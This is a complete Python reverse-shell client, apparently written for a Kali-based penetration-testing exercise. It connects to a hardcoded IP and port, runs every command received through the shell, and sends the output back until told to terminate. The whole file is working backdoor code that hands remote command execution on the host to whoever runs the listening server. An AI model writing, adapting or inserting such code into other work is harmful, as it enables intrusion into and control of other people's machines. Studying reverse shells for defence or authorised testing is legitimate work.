import socket
import subprocess  #  Import necessary libraries


def connect():
    mySocket = socket.socket()  # Initialize socket object
    mySocket.connect(("192.169.94.129", 8080))  # Bind socket to Kali IP and port

    while True:  # Recieve commands from server continuously
        command = mySocket.recv(1024).decode()  # Decode rec'd command

        if "terminate" in command:  # Terminate session if requested
            mySocket.close()
            break
        else:  # Run rec'd command if not 'terminate'
            cmd = subprocess.Popen(
                command,
                shell=True,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
            )

            mySocket.send(cmd.stdout.read())  # Print output on server
            mySocket.send(cmd.stderr.read())  # Print error on server


def main():
    connect()


if __name__ == "__main__":
    main()
